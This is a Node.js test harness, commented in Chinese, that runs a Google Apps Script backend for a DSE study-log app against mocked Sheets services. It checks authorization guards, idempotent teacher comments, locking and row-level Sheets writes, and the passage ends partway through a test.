#!/usr/bin/env node
// gas/test-local.mjs
//
// 本機邏輯測試 —— 純 Node 內建模組，不需要 npm、不需要安裝任何套件。
// 用法：node gas/test-local.mjs
//
// 做法：在一個模擬 Apps Script 環境（假的 SpreadsheetApp／LockService／
// Utilities／ContentService／Sheets 進階服務）中，用 Node 的 vm 模組把
// 真正的 gas/Code.gs 原始碼實際載入、執行，對記憶體內的假資料呼叫
// handler 函式，斷言回傳值符合預期。這是對原始碼的真實 JS 執行，不是
// 重新謄寫一份邏輯來測試。
//
// 這個測試證明的是「Code.gs 內的邏輯本身」：
//   - 老師限定的 handler 是否真的擋走學生 token
//   - targetStudent_ 是否真的忽略 payload.studentId、只認 token 對應的學生
//   - saveComment 是否真的以 (student_id, cohort, period) 冪等（存兩次仍
//     只有一列）
//   - classifyHours_ 對缺席／0／負數／非數字／合法值是否分類到正確的類別
//   - 讀-改-寫的 handler（updateSettings／saveComment）是否真的進了鎖，
//     純讀取的 handler（getWeeklyReport／getClassOverview／
//     getStudentReport）是否真的沒有進鎖
//   - period 格式驗證（assertValidPeriod_）是否真的擋走不合法值
//   - writeRowsFor_（Task 22：取代整表覆寫的 writeRows，見 spec §5.2、
//     task-22-report.md）是否真的呼叫 Sheets.Spreadsheets.Values.batchUpdate
//     並傳入 valueInputOption: 'RAW'（而不是退回 fix round 1 已被證明
//     無效的 Range#setValues() + setNumberFormat('@') 路徑）
//   - writeRowsFor_ 傳給 Sheets API 的值是否原封不動——沒有對任何字元
//     （包括 `=` 開頭）做逃逸／黑名單／字串化，數字欄位（例如 hours）
//     仍然是 JS number、不是字串
//   - （Fix round 3，Critical，Task 22 後由 writeRowsFor_ 延續同一個
//     fail-fast 檢查）「Google Sheets API」進階服務未加入時，
//     writeRowsFor_ 是否真的在碰任何 Range 之前就 fail_()；Sheets API
//     呼叫本身失敗時，原始資料是否完整保留；runSelfTest() 是否真的把
//     這個缺漏當成一則 problem 報出來、且不會因此觸發往返驗證去動真實
//     資料
//   - writeRowsFor_ 是否真的只動它該動的那幾列：覆寫既有列時其餘列
//     逐格不變、newRows 多於／少於 matched 時空位重用與清空是否正確、
//     追加超出 getMaxRows() 時是否先擴張格線再寫、以及跨學生／跨日期
//     的隔離性（見下方 writeRowsFor_ 測試區塊）
//
// ============================================================
// 這個測試 **不能** 證明的事（Fix round 2 教訓：這正是上一輪讓
// setNumberFormat('@') 這個錯誤方案騙過本機測試、一路撐到 live 才被
// 拆穿的缺口——本機的假 Sheets 服務只是照我們「以為」RAW 會怎麼運作寫的
// 一個極簡替身，它自己不會、也不可能執行 Google 真正的公式解析器）：
//   - 真實 Google Sheets 是否真的照 Sheets API 官方文件保證的那樣，把
//     valueInputOption: 'RAW' 的字串輸入一律存成字面文字、完全不解析成
//     公式——這裡的 FakeSheets.Spreadsheets.Values.update() 只是把
//     values 矩陣原樣塞進假資料，**不會**（也不可能）模擬 Google 那端
//     真正的公式解析引擎。上一輪的 setNumberFormat 方案在本機測試裡也是
//     「全部通過」，因為本機測試從來沒有能力戳穿那個假設——這正是本輪
//     修正要老實承認、而不是重蹈覆轍的地方。
//   - 位元組對位元組的完整往返（中文字、換行符號、emoji 等）在真實
//     Google Sheets 上是否真的原樣存回
//   - 真實 LockService 在多個並發請求下的排隊行為
//   - 真實 Google Sheet 的資料形狀（既有格式化的日期欄位、合併儲存格等）
//   - 部署後端對端的網路層行為（doPost 的 302 重導向、Google 端偶發的
//     暫時性 404）
// 這些只能在老師重新部署後對 live 後端驗證，見 docs/plans/
// 2026-07-29-phase1.md 與 .superpowers/sdd/2026-07-29-phase1/
// task-9-report.md 的 Verification 一節。
// ============================================================
//
// 這是給日後維護這幾個 handler 的人用的選用開發者工具。老師不需要、也
// 不會執行這個檔案——部署與驗收流程完全不依賴它。

import vm from 'node:vm';
import fs from 'node:fs';
import assert from 'node:assert/strict';

const CODE_PATH = new URL('./Code.gs', import.meta.url);

class FakeSheet {
  constructor(header, rows, maxRows) {
    this.header = header.slice();
    this.rows = rows.map((r) => r.slice());
    // Task 22 之後 writeRowsFor_ 一律經 batchUpdate 完成覆寫／清空／
    // 追加（清空一列就是把該列的 values 送成全空字串，見 Code.gs 的
    // writeRowsFor_），不再呼叫 Range#clearContent()。這個欄位理論上
    // 恆為 0，保留只是為了讓「Sheets 未定義時完全沒有觸碰任何 range」
    // 這類斷言有一個顯式的計數器可查（見下方 writeRowsFor_ 測試區塊）。
    this.clearContentCalls = 0;
    // 格線總列數（Sheets API 不會自動擴張，超出會回 exceeds grid
    // limits）。預設給充裕空間（模擬新試算表分頁的預設列數），需要測試
    // 「追加超出 maxRows」情境時另外傳入較小的值。
    this.maxRows = maxRows !== undefined ? maxRows : 1000;
    this.insertRowsAfterCalls = [];
    // Task 22 fix round 5：模擬 live 已證實的平台行為——同一次執行內
    // （= 同一個 FakeSheet 實例的生命週期，對應 loadSandbox() 一次
    // 呼叫），透過 Sheets 進階服務（REST／makeSheetsApiStub 的
    // batchUpdate）寫入過的列，`getDataRange()`（= SpreadsheetApp）讀
    // 到的內容會是過期的（維度／列數仍然新鮮，只有內容過期）。
    // `staleRows` 記錄「這次執行內被 REST 寫過、SpreadsheetApp 讀不到
    // 真正內容」的 0-based 列索引；`Values.get`（REST）一律讀
    // `this.rows` 本身，不受這個影響——REST 永遠新鮮，這是 live 診斷
    // （DIAG4／DIAG5）確認過的事，不是待驗證的假設。
    this.staleRows = new Set();
  }
  getDataRange() {
    const self = this;
    return {
      getValues() {
        const body = self.rows.map((r, idx) =>
          self.staleRows.has(idx) ? new Array(self.header.length).fill('') : r.slice());
        return [self.header.slice()].concat(body);
      }
    };
  }
  getLastRow() {
    return 1 + this.rows.length;
  }
  getMaxRows() {
    return this.maxRows;
  }
  insertRowsAfter(afterRow, numRows) {
    this.insertRowsAfterCalls.push({ afterRow: afterRow, numRows: numRows });
    this.maxRows += numRows;
  }
  /**
   * 模擬「開一個全新的 SpreadsheetApp handle」或「時間經過足夠久，
   * 快取自然失效」——清空 staleRows，讓 getDataRange() 之後的讀取重新
   * 看得到目前的真實內容。測試裡用來標記「這裡代表另一次獨立的
   * doPost() 執行」，不是代表某個已驗證的修法（flush() 是否真的有這個
   * 效果，live 診斷有 confound、未證實，見 Code.gs 的說明；這個方法
   * 純粹是測試基建，不是在模擬 flush()）。
   */
  freshen() {
    this.staleRows.clear();
  }
}

function makeSheets() {
  return {
    students: new FakeSheet(
      ['student_id', 'name_zh', 'name_en', 'class', 'cohort', 'password', 'my_subjects', 'lang', 'theme', 'session_token', 'token_expiry', 'status'],
      [
        ['S1', '學生一', 'Student One', '6A', '2026', 'pw123456', 'MATH,ENG', 'zh', 'light', '', '', 'active'],
        ['S2', '學生二', 'Student Two', '6B', '2026', 'pw123456', 'MATH', 'zh', 'light', '', '', 'active']
      ]
    ),
    teachers: new FakeSheet(
      ['teacher_id', 'name', 'password', 'role', 'lang', 'theme', 'session_token', 'token_expiry', 'status'],
      [['T1', '老師一', 'tpw123456', 'teacher', 'zh', 'light', '', '', 'active']]
    ),
    subjects: new FakeSheet(['code', 'name_zh', 'name_en', 'sort', 'active'], [
      ['MATH', '數學', 'Math', '1', 'TRUE'], ['ENG', '英文', 'English', '2', 'TRUE']
    ]),
    teacher_comments: new FakeSheet(['student_id', 'cohort', 'period', 'comment', 'teacher_id', 'updated_at'], []),
    config: new FakeSheet(['key', 'value'], [
      ['current_cohort', '2026'],
      ['dse_start_date', '2026-04-09'],
      ['exam_dates', '{"2026-04-09":"中文"}'],
      ['quotes_zh', '["一分耕耘，一分收穫。"]'],
      ['quotes_en', '["Small steps every day add up."]'],
      ['app_name_zh', 'DSE 溫習日誌'],
      ['app_name_en', 'DSE Study Log']
    ]),
    records_2026: new FakeSheet(['id', 'student_id', 'date', 'subject_code', 'hours', 'content', 'updated_at'], [
      ['r1', 'S1', '2026-01-05', 'MATH', '2', '溫習', '2026-01-05T00:00:00.000Z'],
      ['r2', 'S1', '2026-01-06', 'ENG', '1', '溫習', '2026-01-06T00:00:00.000Z'],
      ['r3', 'S1', '2025-12-29', 'MATH', '3', '上週', '2025-12-29T00:00:00.000Z'],
      ['r4', 'S2', '2026-01-05', 'MATH', '1', '溫習', '2026-01-05T00:00:00.000Z']
    ]),
    days_2026: new FakeSheet(['student_id', 'date', 'mood', 'reflection', 'updated_at'], [
      ['S1', '2026-01-05', 'ok', '今日OK', '2026-01-05T00:00:00.000Z']
    ])
  };
}

/**
 * 假的 Sheets 進階服務。**只**記錄呼叫參數、並把每個 range 的 values
 * 原樣塞進對應 FakeSheet 的 rows（純粹的記憶體 assign，不做任何解析／
 * 逃逸／型別轉換）——這是刻意的極簡替身，用來斷言「我們的程式碼有沒有
 * 呼叫對的 API、傳對的參數、傳未經竄改的值」，**不是**、也不可能是對
 * Google 真實公式解析引擎的模擬。見檔頭「不能證明」的說明。
 *
 * Task 22 之後 Code.gs 呼叫 `Sheets.Spreadsheets.Values.batchUpdate`
 * （不再呼叫單一 range 的 `update`）；Task 22 fix round 2 之後，
 * `writeRowsFor_` 一次呼叫最多送出**兩次**獨立的 `batchUpdate`（第一次
 * 全部寫入真實內容，第二次只清空多餘 matched 列，見 `Code.gs` 的文件
 * 註解「兩次呼叫、不依賴原子性」一節）——這個假 stub 本身不需要知道
 * 「兩次」這件事，它只是逐次記錄每一次呼叫、依序 apply，測試檔用
 * `calls.length` 分辨第幾次呼叫。
 *
 * `throwOnBatchUpdate: true` 時，**每一次** `batchUpdate()` 呼叫都會在
 * 記錄參數之後、碰觸任何 FakeSheet 資料之前就拋出例外——模擬「Sheets
 * API 呼叫本身失敗」（網路、配額、或任何非「忘記加入進階服務」的
 * 原因）。`throwOnCallNumber: N` 則只在第 N 次 `batchUpdate()` 呼叫時
 * 拋出例外（1-indexed），其餘呼叫正常套用——用來精準模擬「兩次呼叫
 * 裡，其中一次失敗、另一次成功」的情境（見下方「call 1 失敗」「call 2
 * 失敗」兩個測試），驗證 fix round 2 的核心保證：這兩種部分失敗都不該
 * 造成資料憑空消失。
 *
 * Task 22 fix round 5：`batchUpdate` 每寫入一列，連帶把那一列標記進
 * 對應 `FakeSheet.staleRows`（見該類別的說明）——模擬 live 診斷證實的
 * 平台行為：`SpreadsheetApp`（`getDataRange()`）在同一次執行內看不到
 * 這次 REST 寫入的內容。新增的 `Values.get` 則相反：一律直接讀
 * `sheet.rows` 本身，完全不受 `staleRows` 影響——REST 讀永遠新鮮，這
 * 是 live 診斷（DIAG4／DIAG5）確認過的事實，不是這個 stub 自己發明的
 * 假設。
 */
function makeSheetsApiStub(sheetsStore, opts) {
  opts = opts || {};
  const calls = [];
  return {
    calls,
    api: {
      Spreadsheets: {
        Values: {
          batchUpdate(resource, spreadsheetId) {
            const data = (resource && resource.data) || [];
            calls.push({
              spreadsheetId: spreadsheetId,
              valueInputOption: resource && resource.valueInputOption,
              data: data.map((d) => ({ range: d.range, values: d.values.map((row) => row.slice()) }))
            });
            const callNumber = calls.length;
            const shouldThrow = opts.throwOnBatchUpdate
              || (opts.throwOnCallNumber !== undefined && callNumber === opts.throwOnCallNumber);
            if (shouldThrow) {
              throw new Error('模擬 Sheets API batchUpdate 第 ' + callNumber + ' 次呼叫失敗（例如網路或配額問題），刻意不寫入任何資料');
            }
            data.forEach((entry) => {
              const parts = String(entry.range).split('!');
              const sheetName = parts[0];
              const rowMatch = /^[A-Z]+(\d+):/.exec(parts[1] || '');
              const rowNum = rowMatch ? Number(rowMatch[1]) : null;
              const sheet = sheetsStore[sheetName];
              if (!sheet) throw new Error('FakeSheetsApi: 找不到分頁 ' + sheetName);
              if (!rowNum) throw new Error('FakeSheetsApi: 無法解析 range 列號 ' + entry.range);
              const idx = rowNum - 2; // 列號 2（表頭後第一列）對應 rows[0]
              while (sheet.rows.length <= idx) sheet.rows.push(new Array(sheet.header.length).fill(''));
              sheet.rows[idx] = entry.values[0].slice();
              sheet.staleRows.add(idx); // 這一列在「SpreadsheetApp 視角」變過期，見上方說明
            });
            return {};
          },
          /**
           * 對應 Code.gs 的 getDataRangeViaRest_()——一律回傳
           * sheet.rows 目前的真實內容（不受 staleRows 影響），矩形化
           * 到跟表頭一樣寬，模擬真正的 REST 讀取永遠新鮮。`range`
           * 這裡只用分頁名稱（不含 A1 cell range，對應
           * getDataRangeViaRest_() 傳入 `name` 本身），用 `!` 分隔取
           * 第一段即可涵蓋兩種寫法。
           */
          get(spreadsheetId, range) {
            const sheetName = String(range).split('!')[0];
            const sheet = sheetsStore[sheetName];
            if (!sheet) throw new Error('FakeSheetsApi.get: 找不到分頁 ' + sheetName);
            const body = sheet.rows.map((r) => r.slice());
            return { values: [sheet.header.slice()].concat(body) };
          }
        }
      }
    }
  };
}

/**
 * 載入一份全新的 Code.gs 執行環境，回傳 sandbox 與鎖／Sheets API 呼叫記錄。
 *
 * options:
 *   withSheetsApi（預設 true）—— false 時，sandbox 裡完全不放 `Sheets`
 *     這個全域變數，模擬老師沒有加入「Google Sheets API」進階服務時
 *     `typeof Sheets === 'undefined'` 這個 fail-fast 檢查要處理的真實
 *     情況（不是把 `Sheets`設成 `undefined`——那樣 `typeof` 一樣會是
 *     `'undefined'`，但語意上更準確的做法是整個不宣告，貼近 Apps
 *     Script 真正「沒加這個服務」時的狀態：`Sheets` 是未宣告的全域）。
 *   throwOnBatchUpdate（預設 false）—— 每一次 batchUpdate 呼叫都失敗，
 *     見 makeSheetsApiStub 的說明。
 *   throwOnCallNumber（預設不設）—— 只有第 N 次 batchUpdate 呼叫失敗
 *     （1-indexed），見 makeSheetsApiStub 的說明。
 */
function loadSandbox(options) {
  options = options || {};
  const withSheetsApi = options.withSheetsApi !== false;
  const sheetsStore = makeSheets();
  const lockCalls = [];
  const sheetsApiStub = makeSheetsApiStub(sheetsStore, {
    throwOnBatchUpdate: !!options.throwOnBatchUpdate,
    throwOnCallNumber: options.throwOnCallNumber
  });
  const SpreadsheetApp = {
    getActiveSpreadsheet() {
      return {
        getId() { return 'FAKE_SPREADSHEET_ID'; },
        getSheetByName(name) { return sheetsStore[name] || null; }
      };
    }
  };
  const LockService = {
    getScriptLock() {
      return {
        tryLock() { lockCalls.push('lock'); return true; },
        releaseLock() { lockCalls.push('unlock'); }
      };
    }
  };
  const Utilities = { getUuid() { return 'uuid-' + Math.random().toString(36).slice(2); } };
  const ContentService = {
    MimeType: { JSON: 'JSON' },
    createTextOutput(s) { return { _text: s, setMimeType() { return this; } }; }
  };
  const Logger = { log() {} }; // runSelfTest() 結尾會呼叫 Logger.log()，本機測試不需要真的輸出
  const sandbox = {
    SpreadsheetApp, LockService, Utilities, ContentService, Logger,
    console, Date, JSON, String, Number, Object, RegExp, Math, Set, Error
  };
  if (withSheetsApi) sandbox.Sheets = sheetsApiStub.api;
  vm.createContext(sandbox);
  const code = fs.readFileSync(CODE_PATH, 'utf8');
  vm.runInContext(code, sandbox, { filename: 'Code.gs' });
  return { sandbox, sheetsStore, lockCalls, sheetsApiCalls: sheetsApiStub.calls };
}

const studentActor = { kind: 'student', id: 'S1', row: { cohort: '2026', student_id: 'S1' }, sheetName: 'students' };
const teacherActor = { kind: 'teacher', id: 'T1', row: { teacher_id: 'T1' }, sheetName: 'teachers' };

let failures = 0;
function check(label, fn) {
  try {
    fn();
    console.log('PASS  ' + label);
  } catch (e) {
    failures++;
    console.log('FAIL  ' + label + '  -> ' + (e && e.message || e));
  }
}

// --- targetStudent_ 路由：學生忽略 payload.studentId、老師的 write 被擋 ---

check('targetStudent_: 學生忽略 payload.studentId，只認 token 對應的學生', () => {
  const { sandbox } = loadSandbox();
  const id = sandbox.targetStudent_(studentActor, { studentId: 'S2' }, 'read');
  assert.equal(id, 'S1');
});

check('targetStudent_: 老師 mode=write 一律 FORBIDDEN', () => {
  const { sandbox } = loadSandbox();
  assert.throws(
    () => sandbox.targetStudent_(teacherActor, { studentId: 'S1' }, 'write'),
    (e) => e.code === 'FORBIDDEN'
  );
});

// --- 老師限定守門：getClassOverview / getStudentReport / saveComment ---

check('getClassOverview: 學生呼叫 -> FORBIDDEN', () => {
  const { sandbox } = loadSandbox();
  assert.throws(
    () => sandbox.handleGetClassOverview(studentActor, { weekStart: '2026-01-05' }),
    (e) => e.code === 'FORBIDDEN'
  );
});

check('getStudentReport: 學生呼叫 -> FORBIDDEN', () => {
  const { sandbox } = loadSandbox();
  assert.throws(
    () => sandbox.handleGetStudentReport(studentActor, { studentId: 'S1' }),
    (e) => e.code === 'FORBIDDEN'
  );
});

check('saveComment: 學生呼叫 -> FORBIDDEN', () => {
  const { sandbox } = loadSandbox();
  assert.throws(
    () => sandbox.handleSaveComment(studentActor, { studentId: 'S1', comment: 'x' }),
    (e) => e.code === 'FORBIDDEN'
  );
});

// --- saveComment 冪等性 ---

check('saveComment: 存兩次只有一列，內容更新為第二次；不同 period 各自成列', () => {
  const { sandbox, sheetsStore } = loadSandbox();
  // 這個測試依序呼叫三次 handleSaveComment、一次 handleGetStudentReport，
  // 在真實系統裡對應四次獨立的 doPost() 執行（老師分開點擊四次），彼此
  // 之間本來就是全新的一次 SpreadsheetApp 讀取，不會踩到 fix round 5
  // 那個「同執行內容過期」的平台行為。每次呼叫之間用 freshen()
  // 明確標記「這是下一次獨立執行」，而不是誤用同一個 sandbox 生命週期
  // 內尚未過期的舊快照——這才是這個測試真正要驗證的東西（冪等性邏輯），
  // 不是要重現/迴避同執行內容過期的症狀。
  sandbox.handleSaveComment(teacherActor, { studentId: 'S1', period: 'overall', comment: '第一次評語' });
  sheetsStore.teacher_comments.freshen();
  let rows = sandbox.readSheet('teacher_comments').filter((c) => c.student_id === 'S1' && c.period === 'overall');
  assert.equal(rows.length, 1);
  assert.equal(rows[0].comment, '第一次評語');

  sandbox.handleSaveComment(teacherActor, { studentId: 'S1', period: 'overall', comment: '第二次評語' });
  sheetsStore.teacher_comments.freshen();
  rows = sandbox.readSheet('teacher_comments').filter((c) => c.student_id === 'S1' && c.period === 'overall');
  assert.equal(rows.length, 1, '第二次存入後仍應只有 1 列（更新而非新增）');
  assert.equal(rows[0].comment, '第二次評語');

  sandbox.handleSaveComment(teacherActor, { studentId: 'S1', period: '2026-W31', comment: '期中評語' });
  sheetsStore.teacher_comments.freshen();
  const all = sandbox.readSheet('teacher_comments').filter((c) => c.student_id === 'S1');
  assert.equal(all.length, 2, 'overall + 2026-W31 應各一列');

  sheetsStore.teacher_comments.freshen();
  const report = sandbox.handleGetStudentReport(teacherActor, { studentId: 'S1', period: 'overall' });
  assert.equal(report.comment, '第二次評語');
});

// --- period 格式驗證 ---

check('assertValidPeriod_: overall／ISO 週通過，其餘格式 BAD_INPUT', () => {
  const { sandbox } = loadSandbox();
  sandbox.assertValidPeriod_('overall'); // 不應拋出
  sandbox.assertValidPeriod_('2026-W31'); // 不應拋出
  assert.throws(() => sandbox.assertValidPeriod_('2026-w31'), (e) => e.code === 'BAD_INPUT'); // 大小寫錯
  assert.throws(() => sandbox.assertValidPeriod_('期中'), (e) => e.code === 'BAD_INPUT');
  assert.throws(() => sandbox.assertValidPeriod_(''), (e) => e.code === 'BAD_INPUT');
});

check('saveComment: period 打錯字 -> BAD_INPUT，且不會寫入孤兒列', () => {
  const { sandbox } = loadSandbox();
  assert.throws(
    () => sandbox.handleSaveComment(teacherActor, { studentId: 'S1', period: 'oveall', comment: 'x' }),
    (e) => e.code === 'BAD_INPUT'
  );
  assert.equal(sandbox.readSheet('teacher_comments').length, 0);
});

// --- classifyHours_ 輸入分類 ---

check('classifyHours_: 缺席／空字串／0 -> omit；負數／非數字 -> invalid；正數 -> value', () => {
  const { sandbox } = loadSandbox();
  assert.equal(sandbox.classifyHours_(undefined), 'omit');
  assert.equal(sandbox.classifyHours_(''), 'omit');
  assert.equal(sandbox.classifyHours_(0), 'omit');
  assert.equal(sandbox.classifyHours_(-1), 'invalid');
  assert.equal(sandbox.classifyHours_('abc'), 'invalid');
  assert.equal(sandbox.classifyHours_(NaN), 'invalid');
  assert.equal(sandbox.classifyHours_(0.25), 'value');
  assert.equal(sandbox.classifyHours_(12), 'value');
});

// --- 鎖的位置：讀-改-寫 handler 進鎖，純讀取 handler 不進鎖 ---

check('updateSettings: 進鎖（lock → unlock 各一次）', () => {
  const { sandbox, lockCalls } = loadSandbox();
  sandbox.handleUpdateSettings(studentActor, { lang: 'en' });
  assert.deepEqual(lockCalls, ['lock', 'unlock']);
});

check('saveComment: 進鎖（lock → unlock 各一次）', () => {
  const { sandbox, lockCalls } = loadSandbox();
  sandbox.handleSaveComment(teacherActor, { studentId: 'S1', comment: 'x' });
  assert.deepEqual(lockCalls, ['lock', 'unlock']);
});

check('getWeeklyReport / getClassOverview / getStudentReport: 完全不進鎖', () => {
  const { sandbox, lockCalls } = loadSandbox();
  sandbox.handleGetWeeklyReport(studentActor, { weekStart: '2026-01-05' });
  sandbox.handleGetClassOverview(teacherActor, { weekStart: '2026-01-05' });
  sandbox.handleGetStudentReport(teacherActor, { studentId: 'S1' });
  assert.deepEqual(lockCalls, []);
});

check('updateSettings: 密碼太短在進鎖前就被拒絕（不觸發任何 lock 呼叫）', () => {
  const { sandbox, lockCalls } = loadSandbox();
  assert.throws(
    () => sandbox.handleUpdateSettings(studentActor, { password: '123' }),
    (e) => e.code === 'BAD_INPUT'
  );
  assert.deepEqual(lockCalls, [], '密碼驗證應在 withLock_ 之前執行，不應該有任何 lock/unlock 記錄');
});

// --- writeRowsFor_（Task 22）：以列為單位的精準寫入 ---
//
// 全部以 FakeSheet 的實際列內容（cell-by-cell）斷言，不是只看列數——
// 一個只檢查列數的測試會在資料其實已經被弄亂時仍然通過（見 brief 對
// 「隔離性」「newRows 為空」兩個案例的特別要求）。

check('writeRowsFor_: 覆寫既有單列時，其餘列逐格不變（updateSettings 只動一列）', () => {
  const { sandbox, sheetsStore } = loadSandbox();
  const s2Before = sheetsStore.students.rows[1].slice(); // S2 是 seed 資料第二列
  sandbox.handleUpdateSettings(studentActor, { lang: 'en', theme: 'dark' });
  const rows = sheetsStore.students.rows;
  assert.deepEqual(rows[1], s2Before, 'S2 的列必須逐格不變（不是只檢查列數）');
  assert.equal(rows[0][7], 'en', 'S1 的 lang 欄應更新');
  assert.equal(rows[0][8], 'dark', 'S1 的 theme 欄應更新');
});

/**
 * 逐格比對「這一列是不是全空」——刻意不用 assert.deepEqual 比對一個
 * 現場 new Array(n).fill('') 的 host-realm 陣列：writeRowsFor_ 是在 vm
 * context 內執行，它建構出來的空陣列即使結構相同，也會因為跨 realm 的
 * 內部識別差異被 assert.deepEqual 判定為不相等（本檔案其他地方對
 * runSelfTest() 回傳的 problems 陣列也遇到同一個問題，見該處註解）。
 * 用 .every() 逐格檢查空字串是 realm-safe 的寫法。
 */
function assertBlankRow(row, len, msg) {
  assert.equal(row.length, len, msg + '（長度）');
  row.forEach((cell, i) => assert.equal(cell, '', msg + '（第 ' + i + ' 格）'));
}

check('writeRowsFor_: newRows 少於 matched -> 多出的舊列被清空，其他學生的列不變', () => {
  const { sandbox, sheetsStore } = loadSandbox();
  const s2Before = sheetsStore.records_2026.rows[3].slice(); // r4，S2 的列
  // S1 在 seed 資料裡有 3 筆記錄（r1、r2、r3，分屬不同日期），故意用一個
  // 只認 student_id 的 keyPredicate 讓 matched.length 為 3，newRows 只給
  // 1 筆，逼多出的 2 列走「清空」那條路徑。
  sandbox.writeRowsFor_('records_2026', (r) => r.student_id === 'S1', [
    { id: 'new1', student_id: 'S1', date: '2026-03-01', subject_code: 'MATH', hours: 1, content: 'x', updated_at: 't' }
  ]);
  const rows = sheetsStore.records_2026.rows;
  assert.equal(rows[0][0], 'new1', '第一個 matched 列應就地覆寫為 newRows[0]');
  assert.deepEqual(Array.from(rows[0]), ['new1', 'S1', '2026-03-01', 'MATH', 1, 'x', 't']);
  assertBlankRow(rows[1], 7, '第二個 matched 列（多出）應被清空');
  assertBlankRow(rows[2], 7, '第三個 matched 列（多出）應被清空');
  assert.deepEqual(rows[3], s2Before, 'S2 的列必須逐格不變');
});

check('writeRowsFor_: newRows 多於 matched -> 先填空位再追加，空位確實被重用', () => {
  const { sandbox, sheetsStore } = loadSandbox();
  const header = ['id', 'student_id', 'date', 'subject_code', 'hours', 'content', 'updated_at'];
  sheetsStore.blanktest = new FakeSheet(header, [
    new Array(header.length).fill(''),                  // row2：既有空位（軟刪除留下的）
    ['x1', 'S9', '2026-01-01', 'MATH', 1, '', 't0']      // row3：matched
  ]);
  const asObj = (a) => Object.fromEntries(header.map((h, i) => [h, a[i]]));
  sandbox.writeRowsFor_('blanktest', (r) => r.student_id === 'S9', [
    ['n1', 'S9', '2026-01-02', 'MATH', 1, '', 't1'],
    ['n2', 'S9', '2026-01-03', 'MATH', 1, '', 't2'],
    ['n3', 'S9', '2026-01-04', 'MATH', 1, '', 't3']
  ].map(asObj));

  const rows = sheetsStore.blanktest.rows;
  assert.equal(rows.length, 3, '空位被重用，不應該多出一列；只追加真正超出既有列數的那 1 筆');
  assert.equal(rows[0][0], 'n2', '第一個空位（原 row2）應被第一筆多出的 newRows 重用');
  assert.equal(rows[1][0], 'n1', 'matched（原 row3）應就地覆寫為 newRows[0]');
  assert.equal(rows[2][0], 'n3', '用盡空位後才追加到尾端（新的 row4）');
});

// --- Task 22 fix round 4：空位不是「整列全空」，只是第一欄空白 ---
//
// 上面那個「空位」測試用 new Array(header.length).fill('')——整列
// 7 個欄位全部是空字串。DIAG3 在真實 Google Sheet 上觀察到的空位長得
// 不一樣：只有第一欄（id）空白，其他欄位（例如 updated_at）還留著舊
// 資料的殘跡——getDataRange() 之所以會涵蓋到那一列，正是因為它不是
// 整列全空。這個測試刻意用「不完全空白」的空位重現 DIAG3 的真實場景，
// 逐格比對兩筆新資料是否真的都有 id、都找得到——DIAG3 觀察到的症狀
// 正是「matched=[]、id 欄變空白」，不是單純的列數不對。

check('writeRowsFor_: 空位只是第一欄空白（非整列全空）時仍正確視為可重用空位（重現 DIAG3 live 場景）', () => {
  const { sandbox, sheetsStore } = loadSandbox();
  const header = ['id', 'student_id', 'date', 'subject_code', 'hours', 'content', 'updated_at'];
  sheetsStore.dirtyblank = new FakeSheet(header, [
    // row2：第一欄（id）空白，但 updated_at 欄還留著舊時間戳記——
    // 不是整列全空，只是第一欄空白。
    ['', '', '', '', '', '', '2020-01-01T00:00:00.000Z']
  ]);
  const predicate = (r) => r.student_id === '__DIRTYTEST__';
  sandbox.writeRowsFor_('dirtyblank', predicate, [
    { id: 'idX', student_id: '__DIRTYTEST__', date: '2000-01-01', subject_code: 'X', hours: 1, content: '', updated_at: 't1' },
    { id: 'idY', student_id: '__DIRTYTEST__', date: '2000-01-01', subject_code: 'Y', hours: 2, content: '', updated_at: 't2' }
  ]);
  const rows = sheetsStore.dirtyblank.rows;
  assert.equal(rows.length, 2, '一筆重用既有的「不完全空白」空位、一筆追加，不應該多出列');
  // 逐格比對：兩列都必須有正確的 id（不能是空字串），且都能被同一個
  // predicate 找到——DIAG3 觀察到的症狀正是「matched=[]、id 欄變空白」。
  // 這個測試驗證的是 writeRowsFor_ 的 JS 邏輯本身（給定「不完全空白」
  // 的輸入，配對／追加算得對不對），不是同執行內容過期那個平台行為
  // （那個有專屬的迴歸測試，見下方「同一次執行內寫完再讀」），所以先
  // freshen() 代表「這是後續一次獨立的驗證讀取」。
  sheetsStore.dirtyblank.freshen();
  const found = sandbox.readSheet('dirtyblank').filter(predicate);
  assert.equal(found.length, 2, '兩列都應該能被 predicate 找到（DIAG3 的症狀是 matched=[]）');
  assert.ok(found.some((r) => r.id === 'idX' && r.subject_code === 'X'), '應該找到 id=idX 的那一列');
  assert.ok(found.some((r) => r.id === 'idY' && r.subject_code === 'Y'), '應該找到 id=idY 的那一列');
});

// --- Task 22 fix round 5：同一次執行內寫完再讀，不能依賴 SpreadsheetApp
// 的同執行內容快取（DIAG3／DIAG4／DIAG5 的 live 根因，見 Code.gs 的
// readSheet() 不變式說明、task-22-report.md「Fix round 5」）---

check('writeRowsFor_: 同一次執行內寫完再讀（緊接著再呼叫一次要清空剛寫的列），第二次呼叫必須看到第一次剛寫的內容', () => {
  const { sandbox, sheetsStore } = loadSandbox();
  // 這正是 runSelfTest() 連續呼叫兩次 handleSaveDay 的那個模式：同一次
  // 執行（同一個 loadSandbox）內，第一次呼叫寫入，第二次呼叫要清空
  // 第一次剛寫的列。fix round 5 之前，writeRowsFor_ 內部判斷
  // matched／blanks 用的是 sh.getDataRange().getValues()（模擬
  // SpreadsheetApp）；FakeSheet 現在會如實模擬 live 證實的平台行為
  // ——這次呼叫寫入的列會被標記進 staleRows，下一次在同一個 FakeSheet
  // 實例上呼叫 getDataRange() 會把它們讀成空白。
  sandbox.writeRowsFor_('records_2026', (r) => r.student_id === '__FIXROUND5__', [
    { id: 'idA', student_id: '__FIXROUND5__', date: '2000-01-01', subject_code: 'A', hours: 1, content: '', updated_at: 't1' },
    { id: 'idB', student_id: '__FIXROUND5__', date: '2000-01-01', subject_code: 'B', hours: 2, content: '', updated_at: 't2' }
  ]);
  sandbox.writeRowsFor_('records_2026', (r) => r.student_id === '__FIXROUND5__', []);
  const stillThere = sheetsStore.records_2026.rows.filter((r) => r[1] === '__FIXROUND5__' && String(r[0]).trim() !== '');
  assert.equal(stillThere.length, 0,
    '第二次呼叫必須看到第一次剛寫的兩列並清空它們；若因為同執行內容過期而看不到，清空會是靜默的 no-op，兩列會原封不動留著（正是 DIAG3 觀察到的症狀）');
});

check('writeRowsFor_: newRows 為空 -> 符合條件的列全部清空，不符合條件的列一列不動', () => {
  const { sandbox, sheetsStore } = loadSandbox();
  const s2Before = sheetsStore.records_2026.rows[3].slice(); // r4，S2 的列
  sandbox.writeRowsFor_('records_2026', (r) => r.student_id === 'S1', []);
  const rows = sheetsStore.records_2026.rows;
